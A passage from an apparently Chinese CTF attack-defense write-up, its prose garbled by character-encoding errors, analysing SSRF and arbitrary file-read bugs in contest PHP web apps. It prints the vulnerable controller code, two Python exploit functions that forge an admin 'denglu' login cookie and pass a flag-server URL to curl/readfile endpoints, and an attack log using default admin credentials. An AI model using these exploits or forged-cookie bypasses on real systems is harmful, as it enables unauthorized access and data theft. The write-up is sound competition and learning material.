class="variable">$params</span>);</span><br><span class="line"><span class="variable">$opts</span>[CURLOPT_URL] = <span class="title function_ invoke__">substr</span>(<span class="variable">$opts</span>[CURLOPT_URL],<span class="number">0</span>,-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;POST&#x27;</span> :</span><br><span class="line"><span class="comment">//åˆ¤æ–­æ˜¯å¦ä¼ è¾“æ–‡ä»¶</span></span><br><span class="line"><span class="variable">$params</span> = <span class="title function_ invoke__">http_build_query</span>(<span class="variable">$params</span>);</span><br><span class="line"><span class="variable">$opts</span>[CURLOPT_URL] = <span class="variable">$url</span>;</span><br><span class="line"><span class="variable">$opts</span>[CURLOPT_POST] = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$opts</span>[CURLOPT_POSTFIELDS] = <span class="variable">$params</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span> :</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* åˆå§‹åŒ–å¹¶æ‰§è¡Œcurlè¯·æ±‚ */</span></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt_array</span>(<span class="variable">$ch</span>, <span class="variable">$opts</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="variable">$error</span> = <span class="title function_ invoke__">curl_error</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$error</span>)&#123;</span><br><span class="line"><span class="variable">$data</span> = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æäº¤ä¸€ä¸ªurlå°±å¯ä»¥ç›´æ¥è¯·æ±‚äº†ï¼Œå¾ˆé—æ†¾å½“æ—¶æ²¡æœ‰ç«‹åˆ»æ‰¾å‡ºæ¥ï¼Œä¸è¿‡åæ¥ä¹Ÿç»™æˆ‘æä¾›äº†æ€è·¯ï¼Œæ¯•ç«Ÿawdä»¥å‰éƒ½æ˜¯å¥”ç€å‘½ä»¤æ‰§è¡Œæ‹¿shellå»çš„ï¼Œè¿™æ¬¡awdæœ‰ssrfå°±å¤Ÿç”¨äº†ï¼Œè¦æ³¨æ„curlï¼Œfile_get_contentsä¹‹ç±»çš„å‡½æ•°ã€‚</p><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exp1</span>(<span class="params">ip, eid, pid</span>):</span><br><span class="line">    exp1 = models.Exp(eid=eid)</span><br><span class="line">    <span class="comment"># é»‘åå•æ£€æµ‹</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> exp1.check(ip):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-]blacklist&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># è¯·æ±‚</span></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;url&quot;</span>: <span class="string">f&quot;http://flAgserver.top/index.php?token=<span class="subst">&#123;database.TOKEN[pid][<span class="string">&#x27;get_token&#x27;</span>]&#125;</span>&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = exp1.request(url=ip + <span class="string">&quot;index/Api/curlfun&quot;</span>, method=<span class="string">&quot;GET&quot;</span>, headers=<span class="literal">None</span>, cookies=<span class="literal">None</span>, params=params, data=<span class="literal">None</span>, files=<span class="literal">None</span>)</span><br><span class="line">    <span class="comment"># æäº¤ flag</span></span><br><span class="line">    exp1.submit(res=res, pid=pid)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„patchæˆ‘ä»¬ç›´æ¥æŠŠflagè¿‡æ»¤äº†ï¼ˆè¿™é‡Œè®°å¾—å¤§å°å†™ä¸æ•æ„Ÿï¼Œæœ‰é˜Ÿä¼åªè¿‡æ»¤äº†flagï¼Œåˆè¢«æˆ‘ä»¬ç”¨flAgæ‰“ä¸Šäº†ï¼‰</p><p>patchå®Œä¹‹åweb2æ²¡ç»´æŒä¸¤è½®ç»¿ç¯åˆè¢«æ‰“äº†ï¼Œå’Œé˜Ÿä¼å¸ˆå‚…çœ‹æµé‡åˆæåˆ°äº†ç¬¬äºŒä¸ªpayloadã€‚ã€‚</p><p>è¯è¯´åœ¨ä¸¤å‘¨å‰å†…éƒ¨èµ›çš„æ—¶å€™æˆ‘ä»¬é˜Ÿä¼å°±æœ‰ä¸€åWEBæ‰‹æ²‰è¿·æ”¹åå°å¯†ç ï¼Œä»¥è‡³äºåé¢é•¿äº†è®°æ€§ï¼Œæ¯æ¬¡éƒ½è®°å¾—å…ˆçœ‹ä¸€ä¸‹å¯†ç ï¼Œä½†æ— å¥ˆè¿™æ¬¡åå°çš„å¯†ç æˆ‘èµ›æ—¶æ²¡æœ‰æ‰¾åˆ°ï¼Œä¸»è¦æ˜¯ç¿»çœ‹äº†configæ–‡ä»¶å’Œå…¶ä»–æ–‡ä»¶æ‰¾æ•°æ®ï¼Œæ²¡æœ‰ä»”ç»†æ•´ç†ç™»å½•çš„é“¾ï¼Œå…¶å®è¿™é¢˜ä¸éœ€è¦ç™»å½•ä¹Ÿå¯ä»¥ç»•è¿‡ï¼Œä½†æ˜¯ä¸æ‰“ç´§ï¼Œå½“æ—¶æŠ„äº†æ”»å‡»é˜Ÿç™»å½•çš„çš„Cookiesæ¥ç€åˆä¸Šè½¦äº†ï¼Œå¾ˆèˆ’æœã€‚</p><p>expï¼Œç›´æ¥ç”¨burpè½¬çš„ï¼Œå½“æ—¶å†™çš„æ¯”è¾ƒä¹…ï¼Œå› ä¸ºåæ¥å‘ç°æ˜¯è¦tokençš„ï¼Œä½†æ˜¯è¿˜æ˜¯æ‰“äº†æ¯”è¾ƒå¤šçš„é˜Ÿï¼ŒåŒç†ï¼Œå¤§æ¦‚ä¸€å°æ—¶ä¹‹åèƒ½æ‰“çš„é¶æœºåˆæ²¡å‰©å‡ ä¸ªäº†ï¼Œå†åŒç†ï¼Œè¿˜æœ‰é˜Ÿä¼ç”¨flAGèƒ½æ‰“çš„ã€‚</p><p>è·Ÿè¸ªä¸€ä¸‹è¿™ä¸ªpayloadï¼Œæˆ‘ä»¬è¯·æ±‚çš„æ˜¯aiyxä¸‹çš„Systemæ§åˆ¶å™¨backupsbaseæ–¹æ³•ï¼Œè·Ÿè¿›åˆ°Systemæ§åˆ¶å™¨ï¼Œè¿™ä¸ªSystemæ§åˆ¶å™¨æœ‰ç‚¹æ„æ€ï¼Œå¯ä»¥çœ‹åˆ°ä»–æ˜¯ç»§æ‰¿è‡ªBaseçš„ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">System</span> <span class="keyword">extends</span> <span class="title">Base</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;otype != <span class="number">3</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Error!&#x27;</span>;<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›BaseåŸºç±»çš„__construct()ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">parent</span>::<span class="title function_ invoke__">__construct</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//session_unset();</span></span><br><span class="line"><span class="comment">//éªŒè¯ç™»å½•</span></span><br><span class="line"><span class="variable">$login</span> = <span class="title function_ invoke__">cookie</span>(<span class="string">&#x27;denglu&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$login</span>[<span class="string">&#x27;userid&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="string">&#x27;è¯·å…ˆç™»å½•ï¼&#x27;</span>,<span class="string">&#x27;login/login&#x27;</span>,<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$login</span>[<span class="string">&#x27;token&#x27;</span>]) || <span class="variable">$login</span>[<span class="string">&#x27;token&#x27;</span>] != <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;dbapp&#x27;</span>))&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;login/logout&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$request</span> = \think<span class="title class_">\Request</span>::<span class="title function_ invoke__">instance</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$contrname</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">controller</span>();</span><br><span class="line">       <span class="variable">$actionname</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">action</span>();</span><br><span class="line">       </span><br><span class="line">       <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;contrname&#x27;</span>,<span class="variable">$contrname</span>);</span><br><span class="line">       <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;actionname&#x27;</span>,<span class="variable">$actionname</span>);</span><br><span class="line"></span><br><span class="line">       </span><br><span class="line">       <span class="variable language_">$this</span>-&gt;otype = <span class="variable">$login</span>[<span class="string">&#x27;otype&#x27;</span>];</span><br><span class="line">       <span class="variable language_">$this</span>-&gt;uid = <span class="variable">$login</span>[<span class="string">&#x27;userid&#x27;</span>];</span><br><span class="line"></span><br><span class="line">       <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;otype&#x27;</span>,<span class="variable">$this</span>-&gt;otype);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥å¾—åˆ°å¯¹ç™»å½•çš„checkå¦‚ä¸‹ï¼Œè·å¾—åä¸ºâ€™dengluâ€™çš„Cookieï¼Œåˆ†åˆ«æ£€æµ‹æ˜¯å¦å­˜åœ¨useridï¼Œä»¥åŠtokençš„å€¼æ˜¯å¦ä¸ºdbappçš„md5çš„å€¼ï¼Œç»“åˆä¸Šé¢Systemç±»çš„__construct()ï¼Œotypeå¿…é¡»ä¸º3ï¼Œäº†è§£æ€è·¯ä¹‹åå°±å¾ˆå¥½æ„é€ äº†ã€‚ å†å›åˆ°backupsbase()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ•°æ®å¤‡ä»½åˆ°æœåŠ¡å™¨</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lukui  2017-02-17</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> [type] [description]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">backupsbase</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$type</span>=<span class="title function_ invoke__">input</span>(<span class="string">&quot;tp&quot;</span>);</span><br><span class="line">       <span class="variable">$name</span>=<span class="title function_ invoke__">input</span>(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">       <span class="variable">$sql</span>=<span class="keyword">new</span> \org\<span class="title function_ invoke__">Baksql</span>(\think<span class="title class_">\Config</span>::<span class="title function_ invoke__">get</span>(<span class="string">&quot;database&quot;</span>));</span><br><span class="line">       <span class="keyword">switch</span> (<span class="variable">$type</span>)</span><br><span class="line">       &#123;</span><br><span class="line">       <span class="keyword">case</span> <span class="string">&quot;backup&quot;</span>: <span class="comment">//å¤‡ä»½</span></span><br><span class="line">         <span class="keyword">return</span> <span class="variable">$sql</span>-&gt;<span class="title function_ invoke__">backup</span>();</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">case</span> <span class="string">&quot;dowonload&quot;</span>: <span class="comment">//ä¸‹è½½</span></span><br><span class="line">         <span class="variable">$sql</span>-&gt;<span class="title function_ invoke__">downloadFile</span>(<span class="variable">$name</span>);</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">case</span> <span class="string">&quot;restore&quot;</span>: <span class="comment">//è¿˜åŸ</span></span><br><span class="line">         <span class="keyword">return</span> <span class="variable">$sql</span>-&gt;<span class="title function_ invoke__">restore</span>(<span class="variable">$name</span>);</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">case</span> <span class="string">&quot;del&quot;</span>: <span class="comment">//åˆ é™¤</span></span><br><span class="line">         <span class="keyword">return</span> <span class="variable">$sql</span>-&gt;<span class="title function_ invoke__">delfilename</span>(<span class="variable">$name</span>);</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">       <span class="keyword">default</span>: <span class="comment">//è·å–å¤‡ä»½æ–‡ä»¶åˆ—è¡¨</span></span><br><span class="line">           <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fetch</span>(<span class="string">&quot;db_bak&quot;</span>,[<span class="string">&quot;list&quot;</span>=&gt;<span class="variable">$sql</span>-&gt;<span class="title function_ invoke__">get_filelist</span>()]);</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ›´è¿‘downloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * ä¸‹è½½å¤‡ä»½</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> string $fileName</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> array|mixed|string</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">downloadFile</span>(<span class="params"><span class="variable">$fileName</span></span>) </span>&#123;</span><br><span class="line">       <span class="variable">$fileName</span>=<span class="variable">$fileName</span>;</span><br><span class="line">       <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">       <span class="title function_ invoke__">header</span>(<span class="string">&quot;Cache-Control: must-revalidate, post-check=0, pre-check=0&quot;</span>);</span><br><span class="line">       <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Description: File Transfer&#x27;</span>);</span><br><span class="line">       <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application/octet-stream&#x27;</span>);</span><br><span class="line">       <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Disposition: attachment; filename=&#x27;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$fileName</span>));</span><br><span class="line">       <span class="title function_ invoke__">readfile</span>(<span class="variable">$fileName</span>);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æœ€åæˆ‘ä»¬éœ€è¦åšå‡ºçš„è¯·æ±‚æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(&#x27;http://flAgserver.top/index.php?token=&#123;token&#125;&#x27;);</span><br></pre></td></tr></table></figure><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exp2</span>(<span class="params">ip, eid, pid</span>):</span><br><span class="line">    exp2 = models.Exp(eid=eid)</span><br><span class="line">    <span class="comment"># é»‘åå•æ£€æµ‹</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> exp2.check(ip):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-]blacklist&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># è¯·æ±‚</span></span><br><span class="line">    cookies = &#123;</span><br><span class="line">        <span class="string">&quot;denglu&quot;</span>: <span class="string">&quot;think:&#123;\&quot;otype\&quot;:\&quot;3\&quot;,\&quot;userid\&quot;:\&quot;1\&quot;,\&quot;username\&quot;:\&quot;admin\&quot;,\&quot;token\&quot;:\&quot;2b1f613841e255297fc4ca74be3a95fc\&quot;&#125;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">f&quot;http://flAgserver.top/index.php?token=<span class="subst">&#123;database.TOKEN[pid][<span class="string">&#x27;get_token&#x27;</span>]&#125;</span>&quot;</span>,</span><br><span class="line">        <span class="string">&quot;tp&quot;</span>: <span class="string">&quot;dowonload&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    res = exp2.request(url=ip + <span class="string">&quot;aiyx/System/backupsbase&quot;</span>, method=<span class="string">&quot;GET&quot;</span>, cookies=cookies, data=data)</span><br><span class="line">    <span class="comment"># æäº¤ flag</span></span><br><span class="line">    exp2.submit(res=res, pid=pid) </span><br></pre></td></tr></table></figure><p>ç”±äºè¿™ä¸ªæ—¶å€™è¿™é“é¢˜ç›®é€šçŸ¥é©¬ä¸Šè¦ä¸‹çº¿äº†ï¼Œåˆšå¥½Web4çš„ä¸€è¡€ä¹Ÿå‡ºäº†ï¼Œæ‰€ä»¥è·Ÿè¿ç»´çš„å¸ˆå‚…å•†é‡äº†ä¸€ä¸‹æ²¡patchäº†ï¼ˆä¸»è¦æ˜¯å½“æ—¶æ²¡æ—¶é—´ï¼‰ï¼Œå»çœ‹Web4äº†çš„logäº†ï¼Œåé¢è¢«å¹³ç™½æ‰“äº†ä¸¤è½®è¿˜æ˜¯è›®äºçš„ã€‚</p><p>ç„¶åè·³å»çœ‹Web4ï¼ŒWeb4è¢«æ‰“çš„Logå¤§æ¦‚æ˜¯è¿™æ ·çš„ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /admin?redirect=/filemanager/edit/img?file=/homepage/photo1.jpg&amp;url=http<span class="punctuation">:</span><span class="comment">//flagserver.top/index.php?token=&#123;token&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin@admin.com&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;admin@admin.com&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>Web4æ˜¯ä¸ªblogï¼ŒåŒæ ·æœ‰ç™»å½•åŠŸèƒ½ï¼Œæˆ‘ä»¬å…ˆæ¥åˆ†æä¸€ä¸‹å®ƒçš„ç™»å½•æµç¨‹ï¼Œå¯ä»¥æ‰¾ä¸€ä¸‹ç”¨æˆ·åå’Œå¯†ç ï¼Œç”¨æˆ·ååœ¨ä¸¤å¤„æœ‰æç¤ºï¼Œä¸€ä¸ªæ˜¯æ•°æ®åº“å®‰è£…æ–‡ä»¶ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into #prefix#user (id, email, password, session_id, expires, name, type, signed_up, updated, userdata) values (<span class="number">1</span>, <span class="string">&#x27;admin@admin.com&#x27;</span>, <span class="string">&#x27;$2y$10$w9ZitMtP9WIjmYQrsE41OOJglSrAKnpUQEnxUOytum1OVMwk4aDqa&#x27;</span>, <span class="literal">null</span>, (DATETIME(<span class="string">&#x27;now&#x27;</span>)), <span class="string">&#x27;Admin User&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>, (DATETIME(<span class="string">&#x27;now&#x27;</span>)), (DATETIME(<span class="string">&#x27;now&#x27;</span>)), <span class="string">&#x27;[]&#x27;</span>); </span><br></pre></td></tr></table></figure><p>è¿˜æœ‰config.phpä¹Ÿæœ‰ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">email_from = <span class="string">&quot;admin@admin.com&quot;</span></span><br></pre></td></tr></table></figure><p>passwordå°±æ¯”è¾ƒéš¾æï¼Œå¯ä»¥çœ‹åˆ°æ•°æ®åº“ä¼ å…¥çš„passwordæ˜¯ç»è¿‡åŠ å¯†çš„ã€‚åŠ å¯†æ–¹å¼æ˜¯å•¥æˆ‘ä»¬æ˜¯å¯ä»¥æœ”æºçš„ï¼Œå¯ä»¥çœ‹åˆ°å¤§éƒ¨åˆ†çš„pwdéƒ½è°ƒç”¨äº†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user</span>-&gt;pwd = <span class="variable">$docEncryption</span>-&gt;<span class="title function_ invoke__">to_string</span>();</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›ä¹‹åå¯ä»¥çœ‹åˆ°åŠ å¯†æ–¹å¼ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">to_string</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$tmpstr</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_jxqy3</span>();</span><br><span class="line"><span class="variable">$tmpstr</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$tmpstr</span>,-<span class="number">35</span>).<span class="title function_ invoke__">substr</span>(<span class="variable">$tmpstr</span>,<span class="number">0</span>,<span class="number">40</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$tmpstr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŠ å¯†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">get_jxqy3</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$tmpMS</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_shal</span>().<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_md5</span>();</span><br><span class="line"><span class="variable">$tmpNewStr</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$tmpMS</span>,<span class="number">0</span>,<span class="number">9</span>).<span class="string">&#x27;s&#x27;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$tmpMS</span>,<span class="number">10</span>,<span class="number">9</span>).<span class="string">&#x27;h&#x27;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$tmpMS</span>,<span class="number">20</span>,<span class="number">9</span>).<span class="string">&#x27;l&#x27;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$tmpMS</span>,<span class="number">30</span>,<span class="number">9</span>).<span class="string">&#x27;s&#x27;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$tmpMS</span>,<span class="number">40</span>,<span class="number">9</span>).<span class="string">&#x27;u&#x27;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$tmpMS</span>,<span class="number">50</span>,<span class="number">9</span>).<span class="string">&#x27;n&#x27;</span>.<span class="title function_ invoke__">substr</span></span><br><span class="line">(<span class="variable">$tmpMS</span>,<span class="number">60</span>,<span class="number">9</span>).<span class="string">&#x27;y&#x27;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$tmpMS</span>,<span class="number">70</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable">$tmpNewStr</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$tmpNewStr</span>,-<span class="number">36</span>).<span class="title function_ invoke__">substr</span>(<span class="variable">$tmpNewStr</span>,<span class="number">0</span>,<span class="number">36</span>);</span><br><span class="line"><span class="variable">$tmpNewStr</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$tmpNewStr</span>,<span class="number">0</span>,<span class="number">70</span>);</span><br><span class="line"><span class="variable">$tmpNewStr</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$tmpNewStr</span>,<span class="number">0</span>,<span class="number">14</span>).<span class="string">&#x27;j&#x27;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$tmpNewStr</span>,<span class="number">14</span>,<span class="number">14</span>).<span class="string">&#x27;x&#x27;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$tmpNewStr</span>,<span class="number">28</span>,<span class="number">14</span>).<span class="string">&#x27;q&#x27;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$tmpNewStr</span>,<span class="number">32</span>,<span class="number">14</span>).<span class="string">&#x27;y&#x27;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$tmpNewStr</span>,<span class="number">56</span>,<span class="number">14</span>).<span class="string">&#x27;3&#x27;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$tmpNewStr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è°¢é‚€ï¼Œçœ‹åˆ°è¿™é‡Œå®Œå…¨åŠé€€äº†ï¼Œé€†å‘æ‰‹ç‹‚å–œã€‚</p><p>é‰´äºå¯†ç è¿˜æ˜¯<a 